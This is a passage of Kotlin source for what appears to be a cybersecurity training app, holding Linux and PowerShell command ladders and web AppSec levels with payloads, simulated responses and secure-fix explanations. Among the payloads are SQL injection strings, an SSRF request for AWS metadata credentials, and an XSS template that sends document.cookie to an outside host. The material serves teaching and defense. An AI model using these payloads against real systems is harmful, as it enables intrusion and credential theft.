        sampleCommands = listOf("find / -user bandit7 -group bandit6 -size 33c 2>/dev/null", "cat /var/lib/bandit7.password"),
        mockTerminalOutput = "/var/lib/dpkg/info/bandit7.password\nSYS6-OWNR-SEARCH-881",
        skillArea = "Linux Administration",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 7,
        title = "Level 7 → Level 8: Pattern Extraction with 'grep'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password is in 'data.txt' next to the word 'millionth'. Use grep to extract the line.",
        expectedCommandPattern = "grep millionth data.txt|grep -i millionth data.txt",
        solutionPasscode = "GREP-MILLIONTH-MATCH-702",
        hints = listOf("Use 'grep \"millionth\" data.txt' to filter the million-line dataset instantly"),
        sampleCommands = listOf("grep millionth data.txt"),
        mockTerminalOutput = "millionth	GREP-MILLIONTH-MATCH-702",
        skillArea = "Linux Log Triage",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 8,
        title = "Level 8 → Level 9: Unique Line Filtering with 'sort' & 'uniq'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password in 'data.txt' is the only line of text that occurs exactly once. Every other line is repeated multiple times.",
        expectedCommandPattern = "sort data.txt | uniq -u",
        solutionPasscode = "UNIQ-LINE-ONLY-ONCE-992",
        hints = listOf("uniq requires sorted data! Pipe 'sort data.txt' into 'uniq -u'"),
        sampleCommands = listOf("sort data.txt | uniq -u"),
        mockTerminalOutput = "UNIQ-LINE-ONLY-ONCE-992",
        skillArea = "Linux Text Processing",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 9,
        title = "Level 9 → Level 10: Base64 Decryption Pipeline",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password in 'data.txt' is base64 encoded data. Decode it using the terminal pipeline.",
        expectedCommandPattern = "base64 -d data.txt|cat data.txt | base64 -d",
        solutionPasscode = "B64D-DECODE-PASSWD-448",
        hints = listOf("Use 'base64 -d data.txt' or 'cat data.txt | base64 --decode'"),
        sampleCommands = listOf("base64 -d data.txt"),
        mockTerminalOutput = "The password is B64D-DECODE-PASSWD-448",
        skillArea = "Cryptography & Encoding",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 10,
        title = "Level 10 → Level 11: ROT13 Caesar Cipher Translation with 'tr'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password in 'data.txt' has been rotated by 13 positions (ROT13). Reverse the substitution cipher.",
        expectedCommandPattern = "tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt|cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'",
        solutionPasscode = "ROT13-CIPHER-ROTATED-331",
        hints = listOf("Use 'tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt'"),
        sampleCommands = listOf("cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'"),
        mockTerminalOutput = "The password is ROT13-CIPHER-ROTATED-331",
        skillArea = "Cryptography",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 11,
        title = "Level 11 → Level 12: Reverse Hexdump Reconstruction with 'xxd'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The file 'data.txt' is a hexdump of a file that has been repeatedly compressed with gzip, bzip2, and tar. Reconstruct it.",
        expectedCommandPattern = "xxd -r data.txt > unpacked && file unpacked|xxd -r data.txt",
        solutionPasscode = "XXD-REVERSED-ARCHIVE-664",
        hints = listOf("Use 'xxd -r data.txt' to convert hex back to raw binary archive", "Inspect intermediate formats with 'file' and unpack accordingly"),
        sampleCommands = listOf("xxd -r data.txt > file.bin", "file file.bin"),
        mockTerminalOutput = "Unpacking gzip archive... Success!\nXXD-REVERSED-ARCHIVE-664",
        skillArea = "Linux Forensics",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 12,
        title = "Level 12 → Level 13: Inspecting Scheduled Cron Jobs in /etc/cron.d",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "A program is running automatically at regular intervals from cron. Look in /etc/cron.d/ for the configuration and find the script.",
        expectedCommandPattern = "cat /etc/cron.d/*|ls -la /etc/cron.d/ && cat /usr/bin/cronjob_bandit13.sh",
        solutionPasscode = "CRON-AUTOMATION-LEAK-201",
        hints = listOf("Inspect the directory '/etc/cron.d/'", "View the script specified in the crontab definition"),
        sampleCommands = listOf("ls /etc/cron.d/", "cat /etc/cron.d/cronjob_bandit13", "cat /usr/bin/cronjob_bandit13.sh"),
        mockTerminalOutput = "* * * * * bandit13 /usr/bin/cronjob_bandit13.sh >/dev/null 2>&1\nCRON-AUTOMATION-LEAK-201",
        skillArea = "Linux Privilege Escalation",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 13,
        title = "Level 13 → Level 14: SUID Binary Audit & Path Hijacking",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "Search for executables with the SUID bit set (`-perm -4000`) that execute with elevated permissions.",
        expectedCommandPattern = "find / -perm -4000 -type f 2>/dev/null",
        solutionPasscode = "SUID-ELEVATION-FLAG-889",
        hints = listOf("Use 'find / -perm -4000 -type f 2>/dev/null' to locate SUID binaries"),
        sampleCommands = listOf("find / -perm -4000 -type f 2>/dev/null"),
        mockTerminalOutput = "/usr/bin/passwd\n/opt/secret_reader (SUID)\nSUID-ELEVATION-FLAG-889",
        skillArea = "Linux Privilege Escalation",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 14,
        title = "Level 14 → Level 15: Local Port Auditing with 'ss' & 'netstat'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "Submit the current password to port 30000 on localhost to receive the next password.",
        expectedCommandPattern = "nc localhost 30000|echo \"SUID-ELEVATION-FLAG-889\" | nc localhost 30000",
        solutionPasscode = "NETCAT-SOCKET-STREAM-554",
        hints = listOf("Use 'nc localhost 30000' or 'telnet 127.0.0.1 30000' to connect and send the token"),
        sampleCommands = listOf("nc localhost 30000"),
        mockTerminalOutput = "Correct! Here is your Level 15 password: NETCAT-SOCKET-STREAM-554",
        skillArea = "Network & Sockets",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 15,
        title = "Level 15 → Finish: Bash Loop Automation & Port Scanning",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "A daemon is listening on one of the ports between 31000 and 32000. Write a bash loop to probe the range and extract the master key.",
        expectedCommandPattern = "for port in {31000..32000}; do nc -zvw1 localhost \$port 2>&1; done|nmap -p 31000-32000 localhost",
        solutionPasscode = "AEGORA-LINUX-LADDER-MASTER-CERT",
        hints = listOf("Use a bash for-loop: for port in {31000..32000}; do ... done", "Or use nmap: nmap -p 31000-32000 localhost"),
        sampleCommands = listOf("for p in {31000..32000}; do nc -zv localhost \$p 2>&1; done"),
        mockTerminalOutput = "Connection to localhost port 31790 [tcp] succeeded!\nMASTER KEY: AEGORA-LINUX-LADDER-MASTER-CERT\n[★] CONGRATULATIONS: Linux Terminal Ladder Master Badge Verified!",
        skillArea = "Bash Automation",
        isUnlocked = false
      )
    )
  )
  val linuxLadder: StateFlow<List<TerminalLadderLevel>> = _linuxLadder.asStateFlow()

  private val _powershellLadder = MutableStateFlow(
    listOf(
      TerminalLadderLevel(
        levelNumber = 0,
        title = "PS Level 0 → Level 1: PowerShell Cmdlet Discovery & Get-Help",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "Find the password for Level 1 located in a text file on the Desktop. Use Get-ChildItem to locate it.",
        expectedCommandPattern = "Get-ChildItem Desktop|dir Desktop|Get-Content Desktop\\readme.txt",
        solutionPasscode = "PS0-CMDLT-DISCOVERY-912",
        hints = listOf("Use 'Get-ChildItem' to list items", "Use 'Get-Content' to read file contents"),
        sampleCommands = listOf("Get-ChildItem Desktop", "Get-Content Desktop\\readme.txt"),
        mockTerminalOutput = "Directory: C:\\Users\\Alex\\Desktop\nMode   Name\n----   ----\n-a---  readme.txt\nPS0-CMDLT-DISCOVERY-912",
        skillArea = "Windows PowerShell Basics",
        isUnlocked = true,
        isCompleted = true
      ),
      TerminalLadderLevel(
        levelNumber = 1,
        title = "PS Level 1 → Level 2: Hidden Files & Streams with Get-ChildItem -Force",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "The password is hidden in a system directory with the Hidden attribute enabled.",
        expectedCommandPattern = "Get-ChildItem -Hidden|Get-ChildItem -Force|ls -Force",
        solutionPasscode = "PS1-HIDDEN-STREAM-772",
        hints = listOf("Add '-Force' or '-Hidden' to Get-ChildItem to show hidden files"),
        sampleCommands = listOf("Get-ChildItem -Force", "Get-Content .secret_ps.txt"),
        mockTerminalOutput = "Mode   Name\n-a-h-  .secret_ps.txt\nPS1-HIDDEN-STREAM-772",
        skillArea = "PowerShell File System",
        isUnlocked = true,
        isCompleted = false
      ),
      TerminalLadderLevel(
        levelNumber = 2,
        title = "PS Level 2 → Level 3: Object Pipeline & Where-Object Filtering",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "In the 'Data' folder with 500 files, find the single file where Length (file size) is exactly 1774 bytes.",
        expectedCommandPattern = "Get-ChildItem Data | Where-Object { \$_.Length -eq 1774 }|Get-ChildItem Data | ? { \$_.Length -eq 1774 }",
        solutionPasscode = "PS2-PIPELINE-WHERE-OBJ-443",
        hints = listOf("Pipe Get-ChildItem to Where-Object: 'Get-ChildItem Data | Where-Object { \$_.Length -eq 1774 }'"),
        sampleCommands = listOf("Get-ChildItem Data | Where-Object { \$_.Length -eq 1774 }", "Get-Content Data\\node_1774.log"),
        mockTerminalOutput = "Name: node_1774.log   Length: 1774\nPS2-PIPELINE-WHERE-OBJ-443",
        skillArea = "PowerShell Object Pipeline",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 3,
        title = "PS Level 3 → Level 4: Regex Log Auditing with Select-String",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "Search through 'enterprise_syslog.log' for lines containing the keyword 'FLAG-AUTHENTICATED'.",
        expectedCommandPattern = "Select-String -Path enterprise_syslog.log -Pattern \"FLAG-AUTHENTICATED\"|Select-String \"FLAG-AUTHENTICATED\" enterprise_syslog.log",
        solutionPasscode = "PS3-SELECT-STRING-LOGS-881",
        hints = listOf("Use 'Select-String -Path enterprise_syslog.log -Pattern \"FLAG-AUTHENTICATED\"'"),
        sampleCommands = listOf("Select-String -Pattern \"FLAG-AUTHENTICATED\" enterprise_syslog.log"),
        mockTerminalOutput = "enterprise_syslog.log:412: [AUTH] Token: PS3-SELECT-STRING-LOGS-881",
        skillArea = "PowerShell Triage",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 4,
        title = "PS Level 4 → Level 5: Windows Registry Queries with Get-ItemProperty",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "A suspicious key was written to 'HKCU:\\Software\\AegoraCorp'. Query the registry value named 'ApiKey'.",
        expectedCommandPattern = "Get-ItemProperty -Path HKCU:\\Software\\AegoraCorp|Get-ItemPropertyValue -Path HKCU:\\Software\\AegoraCorp -Name ApiKey",
        solutionPasscode = "PS4-REGISTRY-HIVE-INSPECT-552",
        hints = listOf("PowerShell treats the Registry as a drive! Use 'Get-ItemProperty -Path HKCU:\\Software\\AegoraCorp'"),
        sampleCommands = listOf("Get-ItemProperty HKCU:\\Software\\AegoraCorp"),
        mockTerminalOutput = "ApiKey : PS4-REGISTRY-HIVE-INSPECT-552\nPSPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\AegoraCorp",
        skillArea = "Windows Forensics",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 5,
        title = "PS Level 5 → Level 6: Windows Event Log Triage with Get-WinEvent",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "Query Event ID 4625 (Failed Logon) from the Security log to locate the compromised username string.",
        expectedCommandPattern = "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}|Get-EventLog -LogName Security -InstanceId 4625",
        solutionPasscode = "PS5-EVENT-LOG-4625-TRIAGE",
        hints = listOf("Use 'Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}'"),
        sampleCommands = listOf("Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}"),
        mockTerminalOutput = "TimeCreated          Id Message\n-----------          -- -------\n8/25/2026 14:02:11 4625 An account failed to log on: User=PS5-EVENT-LOG-4625-TRIAGE",
        skillArea = "Windows Event Log Forensics",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 6,
        title = "PS Level 6 → Level 7: Base64 UTF-8 Pipeline Decoding",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "Decode the base64 string stored in 'encoded.txt' using .NET encoding reflection in PowerShell.",
        expectedCommandPattern = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content encoded.txt)))",
        solutionPasscode = "PS6-DOTNET-B64-PIPELINE-309",
        hints = listOf("Use '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content encoded.txt)))'"),
        sampleCommands = listOf("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content encoded.txt)))"),
        mockTerminalOutput = "Decoded Output: PS6-DOTNET-B64-PIPELINE-309",
        skillArea = "PowerShell Obfuscation Analysis",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 7,
        title = "PS Level 7 → Finish: Active Directory & Network Socket Audit",
        systemPrompt = "PS C:\\Users\\Alex>",
        goalDescription = "Audit TCP connections in LISTEN state on port 8080 and query the bound service process.",
        expectedCommandPattern = "Get-NetTCPConnection -LocalPort 8080|Get-NetTCPConnection -State Listen",
        solutionPasscode = "AEGORA-POWERSHELL-LADDER-MASTER-CERT",
        hints = listOf("Use 'Get-NetTCPConnection -LocalPort 8080'"),
        sampleCommands = listOf("Get-NetTCPConnection -LocalPort 8080"),
        mockTerminalOutput = "LocalAddress  LocalPort RemoteAddress RemotePort State  OwningProcess\n------------  --------- ------------- ---------- -----  -------------\n0.0.0.0       8080      0.0.0.0       0          Listen 4912\n[★] Verification Token: AEGORA-POWERSHELL-LADDER-MASTER-CERT",
        skillArea = "Network & Endpoint Defense",
        isUnlocked = false
      )
    )
  )
  val powershellLadder: StateFlow<List<TerminalLadderLevel>> = _powershellLadder.asStateFlow()

  fun submitTerminalCommand(
    platform: LadderPlatform,
    levelNumber: Int,
    commandInput: String
  ): Pair<Boolean, String> {
    val cleanInput = commandInput.trim()
    val ladderList = if (platform == LadderPlatform.LINUX_BANDIT) _linuxLadder.value else _powershellLadder.value
    val level = ladderList.find { it.levelNumber == levelNumber } ?: return Pair(false, "Unknown level")

    val patterns = level.expectedCommandPattern.split("|")
    val isMatch = patterns.any { cleanInput.contains(it.trim(), ignoreCase = true) } ||
        cleanInput == level.solutionPasscode

    if (isMatch) {
      // Mark level as completed and unlock next level
      val updated = ladderList.map { item ->
        when (item.levelNumber) {
          levelNumber -> item.copy(isCompleted = true)
          levelNumber + 1 -> item.copy(isUnlocked = true)
          else -> item
        }
      }
      if (platform == LadderPlatform.LINUX_BANDIT) {
        _linuxLadder.value = updated
      } else {
        _powershellLadder.value = updated
      }
      return Pair(true, "${level.mockTerminalOutput}\n\n[✓] Solved! Next Level Unlocked (+${level.xpReward} XP)")
    } else {
      return Pair(false, "bash: command executed but expected target artifact was not revealed. Hint: ${level.hints.firstOrNull() ?: "Review syntax"}")
    }
  }

  // =========================================================================
  // 15. WEB APPSEC SEQUENTIAL LADDER (PortSwigger Shape)
  // =========================================================================
  val webAppSecCategories: List<WebAppSecCategory> = listOf(
    WebAppSecCategory(
      id = "sqli",
      name = "SQL Injection (SQLi)",
      iconName = "Database",
      description = "Deep ladder from raw WHERE clause manipulation to blind time-based exfiltration and second-order payloads.",
      totalLevels = 4,
      completedLevels = 2,
      levels = listOf(
        WebAppSecLevel(
          levelId = "sqli_01",
          categoryId = "sqli",
          title = "Level 1: Authentication Bypass via Tautology",
          difficulty = AppSecDifficulty.APPRENTICE,
          scenarioContext = "An internal e-commerce login portal constructs raw SQL: SELECT * FROM users WHERE username = '\$user' AND password = '\$pass'. Bypass authentication as administrator.",
          targetEndpoint = "/api/v1/auth/login",
          vulnerableParameter = "username",
          mutatedPayloadTemplate = "admin' OR '1'='1' -- ",
          correctPayload = "admin' OR 1=1--",
          simulatedHttpResponse = "HTTP/2 200 OK\nSet-Cookie: auth_session=eyJhbGciOiJIUzI1NiIsInN1YiI6ImFkbWluIn0...\n\n{\"status\":\"authenticated\",\"role\":\"SUPER_ADMIN\",\"access_level\":10}",
          defenseExplanation = "Fix: Use parameterized PreparedStatements. The SQL engine will treat user input strictly as literal data, not executable code syntax.",
          cweId = "CWE-89",
          isCompleted = true
        ),
        WebAppSecLevel(
          levelId = "sqli_02",
          categoryId = "sqli",
          title = "Level 2: UNION-Based Exfiltration of Sensitive Columns",
          difficulty = AppSecDifficulty.PRACTITIONER,
          scenarioContext = "The product filter endpoint reflects database results: /products?category=Hardware. Determine column count and exfiltrate username and password hashes from the 'sys_accounts' table.",
          targetEndpoint = "/api/v1/catalog/filter?category=",
          vulnerableParameter = "category",
          mutatedPayloadTemplate = "Hardware' UNION SELECT username, password_hash, email FROM sys_accounts--",
          correctPayload = "' UNION SELECT username, password_hash, email FROM sys_accounts--",
          simulatedHttpResponse = "HTTP/2 200 OK\nContent-Type: application/json\n\n[{\"item\":\"root\",\"desc\":\"\$2y\$12\$e8X8zWqK9...\",\"meta\":\"admin@corp.internal\"}]",
          defenseExplanation = "Fix: Strongly type ORM queries (e.g., Hibernate / SQLAlchemy) or employ prepared queries with strict input whitelisting.",
          cweId = "CWE-89",
          isCompleted = true
        ),
        WebAppSecLevel(
          levelId = "sqli_03",
          categoryId = "sqli",
          title = "Level 3: Blind Time-Based Inference & Conditional Delays",
          difficulty = AppSecDifficulty.EXPERT,
          scenarioContext = "The tracking cookie endpoint executes an asynchronous database update that does not reflect errors or output. Trigger a 5-second database sleep to infer truth values.",
          targetEndpoint = "/api/v1/tracking",
          vulnerableParameter = "Cookie: TrackingId",
          mutatedPayloadTemplate = "vance' || (SELECT pg_sleep(5))--",
          correctPayload = "xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
          simulatedHttpResponse = "HTTP/2 200 OK (Response elapsed time: 5042ms)\n{\"status\":\"tracking_updated\"}",
          defenseExplanation = "Fix: Parameterize session tracking queries and apply WAF heuristic inspection for sleep() / benchmark() patterns.",
          cweId = "CWE-89",
          isCompleted = false
        )
      )
    ),
    WebAppSecCategory(
      id = "xss",
      name = "Cross-Site Scripting (XSS)",
      iconName = "Code",
      description = "Master Reflected, Stored, and DOM-based injection with modern CSP evasion techniques.",
      totalLevels = 3,
      completedLevels = 1,
      levels = listOf(
        WebAppSecLevel(
          levelId = "xss_01",
          categoryId = "xss",
          title = "Level 1: Reflected XSS into Unencoded HTML Context",
          difficulty = AppSecDifficulty.APPRENTICE,
          scenarioContext = "A company knowledge search engine echoes user query strings directly into the DOM without HTML entity encoding: <div>Search results for: \$query</div>.",
          targetEndpoint = "/search?q=",
          vulnerableParameter = "q",
          mutatedPayloadTemplate = "<script>alert(document.domain)</script>",
          correctPayload = "<script>alert(document.domain)</script>",
          simulatedHttpResponse = "HTTP/2 200 OK\n\n<div>Search results for: <script>alert(document.domain)</script></div>\n[+] Payload Executed in Client Context!",
          defenseExplanation = "Fix: Apply context-aware HTML entity encoding (e.g. OWASP Java HTML Sanitizer or DOMPurify in React/Compose frameworks).",
          cweId = "CWE-79",
          isCompleted = true
        ),
        WebAppSecLevel(
          levelId = "xss_02",
          categoryId = "xss",
          title = "Level 2: Stored XSS in Markdown Comment Preview with Filter Bypass",
          difficulty = AppSecDifficulty.PRACTITIONER,
          scenarioContext = "A blog comment system strips '<script>' tags with a naive regex, but permits HTML image tags with onerror handlers.",
          targetEndpoint = "/api/v1/posts/104/comments",
          vulnerableParameter = "body",
          mutatedPayloadTemplate = "<img src=x onerror=fetch('https://c2.aegora.net/leak?c='+document.cookie)>",
          correctPayload = "<img src=x onerror=alert(document.cookie)>",
          simulatedHttpResponse = "HTTP/2 201 Created\n{\"id\":991,\"author\":\"Alex\",\"body\":\"<img src=x onerror=alert(document.cookie)>\"}",
          defenseExplanation = "Fix: Implement a strict Content-Security-Policy (CSP) with 'script-src 'self' 'nonce-...'' and set HttpOnly on session cookies.",
          cweId = "CWE-79",
          isCompleted = false
        )
      )
    ),
    WebAppSecCategory(
      id = "ssrf",
      name = "Server-Side Request Forgery (SSRF)",
      iconName = "Cloud",
      description = "Exploit server network trust to access internal microservices, AWS IMDSv1 metadata, and Kubernetes etcd keys.",
      totalLevels = 3,
      completedLevels = 1,
      levels = listOf(
        WebAppSecLevel(
          levelId = "ssrf_01",
          categoryId = "ssrf",
          title = "Level 1: AWS EC2 Instance Metadata Exfiltration (IMDSv1)",
          difficulty = AppSecDifficulty.PRACTITIONER,
          scenarioContext = "A PDF report generator accepts a URL parameter to capture a website screenshot. Point the backend server to the cloud metadata address 169.254.169.254.",
          targetEndpoint = "/api/v1/render/pdf?targetUrl=",
          vulnerableParameter = "targetUrl",
          mutatedPayloadTemplate = "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role",
          correctPayload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role",
          simulatedHttpResponse = "HTTP/2 200 OK\nContent-Type: application/json\n\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIA991823XXQZ\",\n  \"SecretAccessKey\": \"kLmNpQrStUvWxYz991204812...\",\n  \"Token\": \"FQoGZX...\"\n}",
          defenseExplanation = "Fix: Enforce AWS IMDSv2 (requires session token headers), and validate URLs against private IP CIDR ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16) at DNS resolution time.",
          cweId = "CWE-918",
          isCompleted = true
        )
      )
    ),
    WebAppSecCategory(
      id = "idor",
      name = "IDOR & Broken Access Control",
      iconName = "Lock",
      description = "Exploit missing object-level authorization checks to tamper with patient records, invoices, and privilege states.",
      totalLevels = 3,
      completedLevels = 1,
      levels = listOf(
        WebAppSecLevel(
          levelId = "idor_01",
          categoryId = "idor",
          title = "Level 1: Insecure Direct Object Reference on Payroll PDF",
          difficulty = AppSecDifficulty.APPRENTICE,
          scenarioContext = "An HR portal downloads paystubs via /api/v1/payroll/invoice_88192.pdf. The server fails to verify if the requesting JWT matches the invoice owner.",
          targetEndpoint = "/api/v1/payroll/invoice_88192.pdf",
          vulnerableParameter = "invoiceId in URI",
          mutatedPayloadTemplate = "Change 88192 to 88190 (CEO Payroll)",
          correctPayload = "/api/v1/payroll/invoice_88190.pdf",
          simulatedHttpResponse = "HTTP/2 200 OK\nContent-Disposition: attachment; filename=\"CEO_Executive_Payroll_Aug2026.pdf\"\n[+] Sensitive Financial Record Leaked!",
          defenseExplanation = "Fix: Implement policy-based authorization checks: verify (currentSession.userId == invoice.ownerId || currentSession.hasRole('HR_ADMIN')).",
          cweId = "CWE-639",
          isCompleted = true
        )
      )
    )
  )

  // =========================================================================
  // 16. BUSINESS APP PATCH WORKFLOW (CMD+CTRL Shape)
  // =========================================================================
  val businessAppPatchLabs: List<BusinessAppPatchLab> = listOf(
    BusinessAppPatchLab(
      id = "patch_lab_01",
      appName = "Apex Enterprise HR & Executive Compensation",
      businessDomain = "Enterprise HR & Payroll",
      title = "BOLA / IDOR in Employee Compensation API",
      businessImpactSummary = "Unauthorized exposure of executive compensation records across 14,000 employees. Direct breach of European GDPR Article 32 and potential regulatory fines up to €20M or 4% of annual global turnover.",
      complianceViolations = listOf("GDPR Art. 32 (Security of Processing)", "SOX 404 (Internal Financial Controls)", "ISO 27001 A.9.4.1 (Information Access Restriction)"),
      vulnerableCodeLanguage = "Kotlin / Spring Boot",
      vulnerableCodeSnippet = """
        @GetMapping("/api/v1/payroll/{employeeId}")
        fun getPayrollRecord(@PathVariable employeeId: String): ResponseEntity<PayrollDto> {
            // ❌ VULNERABILITY: Missing tenant and user authorization check!
            val record = payrollRepository.findByEmployeeId(employeeId)
                ?: return ResponseEntity.notFound().build()
            return ResponseEntity.ok(record.toDto())
        }
      """.trimIndent(),
      interceptedRequest = "GET /api/v1/payroll/EMP-EXEC-001 HTTP/1.1\nHost: hr.apex-corp.internal\nAuthorization: Bearer eyJhbGciOi... (Logged in as junior engineer)",
      exploitationProof = "HTTP/1.1 200 OK\n{\"employeeId\":\"EMP-EXEC-001\",\"title\":\"Chief Financial Officer\",\"baseSalary\":\"$380,000\",\"bonus\":\"$120,000\",\"bankIban\":\"US44APEX991200381\"}",
      patchOptions = listOf(
        AppSecPatchOption(
          id = "patch_01_a",
          codeSnippet = """
            // ❌ Inadequate: Client-side obscurity
            @GetMapping("/api/v1/payroll/{employeeId}")
            fun getPayrollRecord(@PathVariable employeeId: String): ResponseEntity<PayrollDto> {
                val record = payrollRepository.findByEmployeeId(employeeId) ?: return ResponseEntity.notFound().build()
                return ResponseEntity.ok(record.toDto().maskSalaryIfJunior())
            }
          """.trimIndent(),
          isCorrect = false,
          architecturalTradeoff = "Flawed: Business logic remains vulnerable to data leaking in serializer edge cases."
        ),
        AppSecPatchOption(
          id = "patch_01_b",
          codeSnippet = """
            // ✅ VERIFIED SECURE FIX: Server-side RBAC & Tenant Ownership Verification
            @GetMapping("/api/v1/payroll/{employeeId}")
            @PreAuthorize("hasRole('HR_ADMIN') or #employeeId == authentication.principal.employeeId")
            fun getPayrollRecord(
                @PathVariable employeeId: String,
                @AuthenticationPrincipal user: SecurityUser
            ): ResponseEntity<PayrollDto> {
                val record = payrollRepository.findByEmployeeIdAndTenantId(employeeId, user.tenantId)
                    ?: return ResponseEntity.notFound().build()
                auditLogger.logAccess(user.employeeId, "VIEW_PAYROLL", employeeId)
                return ResponseEntity.ok(record.toDto())
            }
          """.trimIndent(),
          isCorrect = true,
          architecturalTradeoff = "Optimal: Enforces declarative Spring Security `@PreAuthorize` before method execution and verifies tenant isolation."
        ),
        AppSecPatchOption(
          id = "patch_01_c",
          codeSnippet = """
            // ❌ Inadequate: WAF Rate Limiting only
            @GetMapping("/api/v1/payroll/{employeeId}")
            @RateLimited(requestsPerMinute = 5)
            fun getPayrollRecord(@PathVariable employeeId: String): ResponseEntity<PayrollDto> { ... }
          """.trimIndent(),
          isCorrect = false,
          architecturalTradeoff = "Flawed: Slows down attacks but does not fix broken access control."
        )
      ),
      verifiedFixExplanation = "The patch introduces `@PreAuthorize` to assert that either the user holds the 'HR_ADMIN' authority or their verified session identity matches the target employee ID. It also binds tenant isolation to prevent cross-organization data leakage and logs audit telemetry."
    ),
    BusinessAppPatchLab(
      id = "patch_lab_02",
      appName = "OmniHealth Clinical EHR & Patient Telehealth",
      businessDomain = "Healthcare & HIPAA Telemedicine",
      title = "Mass Assignment Parameter Tampering in Prescription Dispatch API",
      businessImpactSummary = "Adversary modifies medication dosage parameters during pharmacy checkout due to unvalidated JSON binding. Direct patient safety risk and catastrophic HIPAA civil monetary penalties.",
      complianceViolations = listOf("HIPAA Security Rule § 164.312(c)(1) (Integrity Controls)", "FDA Class II Medical Software Integrity Standards"),
      vulnerableCodeLanguage = "TypeScript / Node.js Express",
      vulnerableCodeSnippet = """
        app.post('/api/v2/prescriptions/refill', async (req, res) => {
          // ❌ VULNERABILITY: Mass assignment of req.body straight into database entity
          const { prescriptionId } = req.body;
          const updated = await PrescriptionModel.findByIdAndUpdate(
            prescriptionId,
            { ...req.body, status: 'DISPATCHED' }, // Overwrites dosage, refills, and prescriber doctor ID!
            { new: true }
          );
          res.json(updated);
        });
      """.trimIndent(),
      interceptedRequest = "POST /api/v2/prescriptions/refill HTTP/1.1\n{\"prescriptionId\":\"RX-8849\",\"dosage\":\"500mg (tampered)\",\"refillsRemaining\":99,\"prescriberDoctorId\":\"DOC-FORGED\"}",
      exploitationProof = "Prescription RX-8849 updated to 500mg with 99 refills without doctor signature authorization.",
      patchOptions = listOf(
        AppSecPatchOption(
          id = "patch_02_a",
          codeSnippet = """
            // ❌ Inadequate: Blacklist approach
            delete req.body.dosage;
            const updated = await PrescriptionModel.findByIdAndUpdate(prescriptionId, req.body);
          """.trimIndent(),
          isCorrect = false,
          architecturalTradeoff = "Blacklisting fields fails when new sensitive properties are added to the entity schema."
        ),
        AppSecPatchOption(
          id = "patch_02_b",
          codeSnippet = """
            // ✅ VERIFIED SECURE FIX: Strict DTO Whitelisting with Zod Validation
            const RefillSchema = z.object({
              prescriptionId: z.string().uuid(),
              patientDeliveryAddress: z.string().min(5).max(200)
            });

            app.post('/api/v2/prescriptions/refill', authenticatePatient, async (req, res) => {
              const validated = RefillSchema.parse(req.body);
              const prescription = await PrescriptionModel.findOne({
                _id: validated.prescriptionId,
                patientId: req.user.id
              });
              if (!prescription || prescription.refillsRemaining <= 0) {
                return res.status(400).json({ error: 'No refills authorized' });
              }
              prescription.refillsRemaining -= 1;
              prescription.deliveryAddress = validated.patientDeliveryAddress;
              await prescription.save();
              res.json({ success: true, refillsRemaining: prescription.refillsRemaining });
            });
          """.trimIndent(),
          isCorrect = true,
          architecturalTradeoff = "Optimal: Explicit schema parsing with strict DTO validation prevents mass assignment entirely."
        )
      ),
      verifiedFixExplanation = "Using strict DTO schemas (Zod/Pydantic/Jackson DTOs) ensures that only explicitly permitted fields are accepted from the HTTP request, completely isolating the entity model from client tampering."
    )
  )

  // =========================================================================
  // 17. BINARY EXPLOITATION & LOW-LEVEL CS (pwn.college shape)
  // =========================================================================
  val binaryExploitationModules: List<BinaryExploitationModule> = listOf(
    BinaryExploitationModule(
      id = "bin_01",
      title = "x86-64 Stack Architecture & Memory Layout",
